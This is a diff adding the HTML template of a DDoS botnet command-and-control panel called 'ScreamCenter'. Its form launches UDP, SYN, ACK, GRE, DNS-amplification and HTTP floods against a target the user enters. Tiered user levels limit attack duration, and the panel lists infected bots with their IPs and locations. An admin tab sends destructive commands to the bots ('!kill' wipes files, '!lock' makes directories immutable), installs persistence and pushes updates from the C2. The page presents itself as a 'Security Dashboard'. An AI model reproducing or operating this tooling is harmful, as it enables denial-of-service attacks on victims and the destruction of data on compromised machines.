@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Dashboard</title>
+    <meta name="csrf-token" content="{{.CSRFToken}}">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/static/styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+</head>
+<body class="min-h-screen flex flex-col terminal-effect">
+    <header class="dashboard-header">
+        <div class="logo-container">
+            <div class="logo-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path>
+                </svg>
+            </div>
+            <h1 class="cyber-title">
+                <span class="text-primary">Scream</span>
+                <span class="text-dim">Center</span>
+            </h1>
+        </div>
+        <div class="header-controls">
+            <div class="connection-status">
+                <span id="connection-status" class="status-indicator status-active" title="Connected"></span>
+                <span id="connection-text" class="connection-text">Connected</span>
+            </div>
+            <div class="profile-dropdown-container">
+                <button id="profile-button" class="profile-button">
+                    <span class="text-sm font-medium text-primary">&#128100; {{.User.Username}}</span>
+                    <span class="cyber-badge {{if eq .User.Level "Owner"}}cyber-badge-owner{{else if eq .User.Level "Admin"}}cyber-badge-admin{{else if eq .User.Level "Pro"}}cyber-badge-stealth{{else if eq .User.Level "Basic"}}cyber-badge-maintenance{{else}}cyber-badge-user{{end}}"> {{.User.Level}} &#9881;&#65039; </span>
+                    <i class="fas fa-chevron-down text-xs text-dim"></i>
+                </button>
+                <div id="profile-dropdown" class="cyber-dropdown hidden">
+                    <div class="profile-info">
+                        <p class="text-sm font-medium text-primary">&#128101; {{.User.Username}}</p>
+                        <p class="text-xs cyber-subtitle mt-1">{{if or (eq .User.Level "Owner") (eq .User.Level "Admin")}}{{end}}</p>
+                    </div>
+                    <div class="dropdown-actions">
+                        {{if or (eq .User.Level "Owner") (eq .User.Level "Admin")}}
+                        <button id="admin-console-btn" class="cyber-dropdown-item">
+                            <i class="fas fa-user-shield mr-2 text-primary"></i> Admin Console
+                        </button>
+                        {{end}}
+                        <a href="/logout" class="cyber-dropdown-item">
+                            <i class="fas fa-sign-out-alt mr-2 text-dim"></i> Terminate Session
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    {{if .FlashMessage}}
+    <div class="cyber-flash">
+        <span class="font-mono">{{.FlashMessage}}</span>
+        <button onclick="this.parentElement.remove()" class="cyber-flash-btn">
+            <i class="fas fa-times"></i>
+        </button>
+    </div>
+    {{end}}
+
+    <div class="metrics-grid">
+        {{if or (eq .User.Level "Owner") (eq .User.Level "Admin")}}
+        <div class="cyber-panel">
+            <div class="metric-header">
+                <p class="cyber-metric-label">&#128225; Connected Bots</p>
+                <div class="metric-icon">
+                    <i class="fas fa-robot text-primary"></i>
+                </div>
+            </div>
+            <p class="cyber-metric bot-count-metric">{{.BotCount}}</p>
+        </div>
+        {{end}}
+
+        <div class="cyber-panel">
+            <div class="metric-header">
+                <p class="cyber-metric-label">&#128737;&#65039; Active Attacks</p>
+                <div class="metric-icon">
+                    <i class="fas fa-bolt text-accent"></i>
+                </div>
+            </div>
+            <p class="cyber-metric attack-count-metric">{{len .OngoingAttacks}}/{{GetMaxConcurrentAttacks .User.Level}}</p>
+        </div>
+        
+        <div class="cyber-panel">
+            <div class="metric-header">
+                <p class="cyber-metric-label">&#9876;&#65039; Attack Power Estimated Capacity</p>
+                <div class="metric-icon">
+                    <i class="fas fa-bolt text-secondary"></i>
+                </div>
+            </div>
+            <p class="cyber-metric">{{printf "%.2f" (getAttackPower .Bots)}} Gbps</p>
+        </div>
+    </div>
+
+    <main class="dashboard-main">
+        <div class="cyber-panel animate-fade-in" style="animation-delay: 0.3s">
+            <div class="panel-header">
+                <h2 class="cyber-title">
+                    <span class="status-indicator"></span> 📡 Active Engagements
+                </h2>
+                <div id="attacks-loading" class="hidden">
+                    <i class="fas fa-sync-alt fa-spin text-primary"></i>
+                </div>
+                {{if .OngoingAttacks}}
+                <button onclick="stopAllAttacks()" class="cyber-btn">
+                    <i class="fas fa-stop-circle"></i>
+                    <span>Stop All</span>
+                </button>
+                {{end}}
+            </div>
+            <div class="custom-scrollbar">
+                <table class="cyber-table">
+                    <thead>
+                        <tr>
+                            <th>Protocol</th>
+                            <th>Target</th>
+                            <th>Duration</th>
+                            <th>Remaining</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="attacks-table">
+                        {{if .OngoingAttacks}}
+                        {{range .OngoingAttacks}}
+                        <tr>
+                            <td>
+                                <span class="attack-method-badge">
+                                    {{FormatMethodIcon .Method }} {{FormatAttackMethodName .Method}}
+                                </span>
+                            </td>
+                            <td class="font-mono text-primary">{{.Target}}:{{.Port}}</td>
+                            <td class="text-primary">{{.Duration}}</td>
+                            <td class="text-primary">{{.Remaining}}</td>
+                            <td>
+                                <a href="/stop-attack?id={{.ID}}" class="attack-stop-btn">
+                                    <i class="fas fa-stop mr-1"></i> Terminate
+                                </a>
+                            </td>
+                        </tr>
+                        {{end}}
+                        {{else}}
+                        <tr>
+                            <td colspan="5" class="text-center text-dim font-mono">No active engagements</td>
+                        </tr>
+                        {{end}}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="cyber-panel animate-fade-in" style="animation-delay: 0.2s">
+            <div class="panel-header">
+                <h2 class="cyber-title">
+                    <span class="status-indicator"></span> ⚔️ Attack Vector
+                </h2>
+            </div>
+            <form action="/attack" method="POST" autocomplete="off" class="attack-form" id="attack-form">
+                <input type="hidden" name="csrf_token" value="{{.CSRFToken}}">
+                <div class="form-group">
+                    <label for="ip" class="cyber-metric-label">
+                        <i class="fas fa-globe text-secondary"></i> Target IP/Domain
+                    </label>
+                    <input type="text" id="ip" name="ip" required placeholder="example.com or 1.1.1.1" class="cyber-input" pattern="^([a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9](?:\.[a-zA-Z]{2,})+|(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$">
+                    <div class="validation-error" id="ip-error"></div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="port" class="cyber-metric-label">
+                        <i class="fas fa-plug text-secondary"></i> Target Port
+                    </label>
+                    <input type="number" id="port" name="port" required placeholder="80" min="1" max="65535" class="cyber-input">
+                    <div class="validation-error" id="port-error"></div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="method" class="cyber-metric-label">
+                        <i class="fas fa-bolt text-secondary"></i> Attack Method
+                    </label>
+                    <select id="method" name="method" required class="cyber-select">
+                        <option value="" disabled selected>Select method</option>
+                        <option value="!udpflood">UDP Flood</option>
+                        <option value="!udpsmart">UDP Smart</option>
+                        <option value="!tcpflood">TCP Flood</option>
+                        <option value="!synflood">SYN Flood</option>
+                        <option value="!ackflood">ACK Flood</option>
+                        <option value="!greflood">GRE Flood</option>
+                        <option value="!dns">DNS Amplification</option>
+                        <option value="!http">HTTP Flood</option>
+                    </select>
+                    <div class="validation-error" id="method-error"></div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="duration" class="cyber-metric-label">
+                        <i class="fas fa-clock text-secondary"></i> Duration (seconds)
+                    </label>
+                    <input type="number" id="duration" name="duration" required placeholder="60" min="10" max="{{GetMaxAttackDuration .User.Level}}" class="cyber-input">
+                    <div class="duration-limits">
+                        <span>Min: 10s</span>
+                        <span>Max: {{GetMaxAttackDuration .User.Level}}s</span>
+                    </div>
+                    <div class="validation-error" id="duration-error"></div>
+                </div>
+                
+                <div class="form-footer">
+                    <button type="submit" class="cyber-btn attack-submit-btn" id="attack-submit" disabled>
+                        <i class="fas fa-rocket mr-2"></i> Launch Attack
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <div class="cyber-panel animate-fade-in" style="animation-delay: 0.4s">
+            <div class="panel-header">
+                <h2 class="cyber-title">
+                    <span class="status-indicator"></span> 💻 Bot Network
+                </h2>
+                <button onclick="refreshBotList()" class="cyber-btn">
+                    <i class="fas fa-sync-alt"></i> Refresh
+                </button>
+            </div>
+            <div class="bot-network-container">
+                <table class="cyber-table">
+                    <thead class="bot-table-header">
+                        <tr>
+                            <th>Status</th>
+                            <th>IP Address</th>
+                            <th>Architecture</th>
+                            <th>CPU Cores</th>
+                            <th>RAM</th>
+                            <th>Location</th>
+                            <th>Last Heartbeat</th>
+                        </tr>
+                    </thead>
+                    <tbody class="bot-table-body" id="bots-table">
+                        {{if .Bots}}
+                        {{range .Bots}}
+                        <tr class="bot-row" data-bot='{{json .}}'>
+                            <td>
+                                {{if isActive .LastHeartbeat}}
+                                <span class="status-indicator status-active"></span> Active
+                                {{else}}
+                                <span class="status-indicator status-inactive"></span> Inactive
+                                {{end}}
+                            </td>
+                            <td class="font-mono text-primary">{{.IP}}</td>
+                            <td class="text-primary">{{.Arch}}</td>
+                            <td class="text-primary">{{if .Cores}}{{.Cores}}{{else}}N/A{{end}}</td>
+                            <td class="text-primary">{{if .RAM}}{{printf "%.2f GB" .RAM}}{{else}}N/A{{end}}</td>
+                            <td class="text-primary">
+                                {{if .City}}{{.City}}, {{end}}
+                                {{if .Region}}{{.Region}}, {{end}}
+                                {{if .Country}}{{.Country}}{{else}}Unknown{{end}}
+                            </td>
+                            <td class="text-primary">{{.LastHeartbeat.Format "2006-01-02 15:04:05"}}</td>
+                        </tr>
+                        {{end}}
+                        {{else}}
+                        <tr>
+                            <td colspan="7" class="text-center text-dim font-mono">No bots connected</td>
+                        </tr>
+                        {{end}}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </main>
+
+    <!-- Admin Overlay -->
+    <div id="admin-overlay" class="overlay hidden">
+        <div class="modal admin-modal">
+            <div class="modal-header">
+                <h2 class="cyber-title">
+                    <i class="fas fa-user-shield text-primary"></i> Admin Console
+                </h2>
+                <button onclick="hideAdminPanel()" class="modal-close-btn">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="admin-tabs">
+                <button id="users-tab" class="tab-button active" data-tab="users" onclick="switchTab('users')">
+                    <i class="fas fa-users mr-2"></i> User Management
+                </button>
+                <button id="commands-tab" class="tab-button" data-tab="commands" onclick="switchTab('commands')">
+                    <i class="fas fa-terminal mr-2"></i> Bot Commands
+                </button>
+                {{if eq .User.Level "Owner"}}
+                <button id="settings-tab" class="tab-button" data-tab="settings" onclick="switchTab('settings')">
+                    <i class="fas fa-cog mr-2"></i> System Settings
+                </button>
+                {{end}}
+            </div>
+
+            <div id="users-content" class="tab-content active">
+                <div class="user-management">
+                    <button onclick="showAddUserForm()" class="cyber-btn">
+                        <i class="fas fa-user-plus"></i>
+                        <span>Create New User</span>
+                    </button>
+                </div>
+                <div id="add-user-form" class="hidden cyber-panel mt-4">
+                    <div class="panel-header">
+                        <h3 class="cyber-title">
+                            <i class="fas fa-user-plus text-primary"></i> Create New User
+                        </h3>
+                        <button onclick="hideAddUserForm()" class="modal-close-btn">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    <form action="/add-user" method="POST" autocomplete="off" class="user-form" id="user-form">
+                        <input type="hidden" name="csrf_token" value="{{.CSRFToken}}">
+                        <div class="form-group">
+                            <label for="new-username" class="cyber-metric-label">
+                                <i class="fas fa-user-tag text-secondary"></i> Username
+                            </label>
+                            <input type="text" id="new-username" name="username" required placeholder="hacker1337" maxlength="32" pattern="^[a-zA-Z0-9_]+$" title="Only letters, numbers and underscores allowed" class="cyber-input">
+                            <p class="text-xs text-dim">Only letters, numbers and underscores allowed</p>
+                            <div class="validation-error" id="username-error"></div>
+                        </div>
+                        <div class="form-group">
+                            <label for="new-password" class="cyber-metric-label">
+                                <i class="fas fa-key text-secondary"></i> Password
+                            </label>
+                            <div class="password-input">
+                                <input type="password" id="new-password" name="password" required placeholder="••••••••••••" autocomplete="new-password" class="cyber-input">
+                                <button type="button" onclick="togglePasswordVisibility('new-password')" class="password-toggle">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                            </div>
+                            <div class="password-requirements">
+                                <div>
+                                    <i class="fas fa-check-circle" id="length-check"></i>
+                                    <span>Minimum 12 characters</span>
+                                </div>
+                                <div>
+                                    <i class="fas fa-check-circle" id="case-check"></i>
+                                    <span>Uppercase & lowercase</span>
+                                </div>
+                                <div>
+                                    <i class="fas fa-check-circle" id="number-check"></i>
+                                    <span>At least one number</span>
+                                </div>
+                                <div>
+                                    <i class="fas fa-check-circle" id="special-check"></i>
+                                    <span>Special character</span>
+                                </div>
+                            </div>
+                            <div class="validation-error" id="password-error"></div>
+                        </div>
+                        <div class="form-group">
+                            <label for="level" class="cyber-metric-label">
+                                <i class="fas fa-shield-alt text-secondary"></i> Access Level
+                            </label>
+                            <select id="level" name="level" required class="cyber-select">
+                                {{if eq .User.Level "Owner"}}
+                                <option value="Owner">Owner</option>
+                                {{end}}
+                                <option value="Admin">Admin</option>
+                                <option value="Pro">Pro</option>
+                                <option value="Basic">Basic</option>
+                                <option value="User">User</option>
+                            </select>
+                            <p class="text-xs text-dim">Owners have full system control</p>
+                        </div>
+                        <div class="form-group">
+                            <label for="expiry" class="cyber-metric-label">
+                                <i class="fas fa-calendar-times text-secondary"></i> Expiration Date (Optional)
+                            </label>
+                            <div class="date-input">
+                                <input type="date" id="expiry" name="expiry" class="cyber-input date-picker" min="{{ now.Format "2006-01-02" }}">
+                                <i class="fas fa-calendar-alt"></i>
+                            </div>
+                            <p class="text-xs text-dim">Leave blank for no expiration</p>
+                        </div>
+                        <div class="form-actions">
+                            <button type="submit" class="cyber-btn" id="user-submit">
+                                <i class="fas fa-user-plus"></i>
+                                <span>Create User</span>
+                            </button>
+                            <button type="button" onclick="hideAddUserForm()" class="cancel-btn">
+                                <i class="fas fa-ban"></i>
+                                <span>Cancel</span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+                <div class="users-table mt-4">
+                    <table class="cyber-table">
+                        <thead>
+                            <tr>
+                                <th>Username</th>
+                                <th>Level</th>
+                                <th>Expires</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {{range .Users}}
+                            <tr>
+                                <td class="text-primary">{{.Username}}</td>
+                                <td>
+                                    {{if eq .Level "Owner"}}
+                                    <span class="cyber-badge cyber-badge-owner">Owner</span>
+                                    {{else if eq .Level "Admin"}}
+                                    <span class="cyber-badge cyber-badge-admin">Admin</span>
+                                    {{else if eq .Level "Pro"}}
+                                    <span class="cyber-badge cyber-badge-pro">Pro</span>
+                                    {{else if eq .Level "Basic"}}
+                                    <span class="cyber-badge cyber-badge-basic">Basic</span>
+                                    {{else}}
+                                    <span class="cyber-badge cyber-badge-user">User</span>
+                                    {{end}}
+                                </td>
+                                <td class="text-primary">{{.Expire.Format "2006-01-02"}}</td>
+                                <td>
+                                    <form action="/delete-user" method="get" class="inline">
+                                        <input type="hidden" name="csrf_token" value="{{$.CSRFToken}}">
+                                        <input type="hidden" name="username" value="{{.Username}}">
+                                        <button type="submit" class="delete-btn" {{if eq .Username $.User.Username}}disabled{{end}}>
+                                            <i class="fas fa-trash-alt mr-1"></i> Delete
+                                        </button>
+                                    </form>
+                                </td>
+                            </tr>
+                            {{end}}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div id="commands-content" class="tab-content">
+                <div class="command-grid">
+                    <div class="command-card">
+                        <div class="command-header">
+                            <h3 class="text-primary">
+                                <i class="fas fa-skull"></i> Kill Switch
+                            </h3>
+                            <span class="cyber-badge cyber-badge-destructive">DESTRUCTIVE</span>
+                        </div>
+                        <p class="text-dim">Wipes files from common directories on infected systems</p>
+                        <div class="command-params">
+                            <label>
+                                Minimum Bots:
+                                <input type="number" value="15" min="1" class="cyber-input" id="kill-min-bots">
+                            </label>
+                        </div>
+                        <button onclick="sendBotCommand('!kill ' + document.getElementById('kill-min-bots').value)" class="cyber-btn">
+                            <i class="fas fa-radiation mr-2"></i> Execute Kill Command
+                        </button>
+                    </div>
+                    <div class="command-card">
+                        <div class="command-header">
+                            <h3 class="text-primary">
+                                <i class="fas fa-lock"></i> File Locker
+                            </h3>
+                            <span class="cyber-badge cyber-badge-destructive">DESTRUCTIVE</span>
+                        </div>
+                        <p class="text-dim">Locks down filesystem by making directories immutable</p>
+                        <button onclick="sendBotCommand('!lock')" class="cyber-btn">
+                            <i class="fas fa-lock mr-2"></i> Execute Lock Command
+                        </button>
+                    </div>
+                    <div class="command-card">
+                        <div class="command-header">
+                            <h3 class="text-primary">
+                                <i class="fas fa-infinity"></i> Persistence
+                            </h3>
+                            <span class="cyber-badge cyber-badge-stealth">STEALTH</span>
+                        </div>
+                        <p class="text-dim">Installs persistence mechanism via systemd and cron</p>
+                        <button onclick="sendBotCommand('!persist')" class="cyber-btn">
+                            <i class="fas fa-save mr-2"></i> Install Persistence
+                        </button>
+                    </div>
+                    <div class="command-card">
+                        <div class="command-header">
+                            <h3 class="text-primary">
+                                <i class="fas fa-sync-alt"></i> Update Bots
+                            </h3>
+                            <span class="cyber-badge cyber-badge-maintenance">MAINTENANCE</span>
+                        </div>
+                        <p class="text-dim">Force all bots to update from C2 server</p>
+                        <button onclick="sendBotCommand('!update')" class="cyber-btn">
+                            <i class="fas fa-cloud-download-alt mr-2"></i> Push Update
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            {{if eq .User.Level "Owner"}}
+            <div id="settings-content" class="tab-content">
+                <div class="settings-form">
+                    <form action="/update-settings" method="POST" id="settings-form">
+                        <input type="hidden" name="csrf_token" value="{{.CSRFToken}}">
+                        <div class="form-group">
+                            <label for="max-attack-duration" class="cyber-metric-label">
+                                <i class="fas fa-clock text-secondary"></i> Maximum Attack Duration (seconds)
+                            </label>
+                            <input type="number" id="max-attack-duration" name="max_attack_duration" class="cyber-input" min="60" max="86400" value="3600">
+                        </div>
+                        <div class="form-group">
+                            <label for="heartbeat-interval" class="cyber-metric-label">
+                                <i class="fas fa-heartbeat text-secondary"></i> Heartbeat Interval (seconds)
+                            </label>
+                            <input type="number" id="heartbeat-interval" name="heartbeat_interval" class="cyber-input" min="10" max="600" value="30">
+                        </div>
+                        <div class="form-actions">
+                            <button type="submit" class="cyber-btn">
+                                <i class="fas fa-save mr-2"></i> Save Settings
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+            {{end}}
+        </div>
+    </div>
+
+    <!-- Bot Details Modal -->
+    <div id="bot-details-modal" class="overlay hidden">
+        <div class="modal">
+            <div class="modal-header">
+                <h2 class="cyber-title">
+                    <i class="fas fa-robot text-primary"></i> Bot Details
+                </h2>
+                <button onclick="hideBotDetails()" class="modal-close-btn">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div id="bot-details-content" class="modal-content">
+                <!-- Content will be loaded dynamically -->
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script src="/static/main.js"></script>
+</body>
+</html>
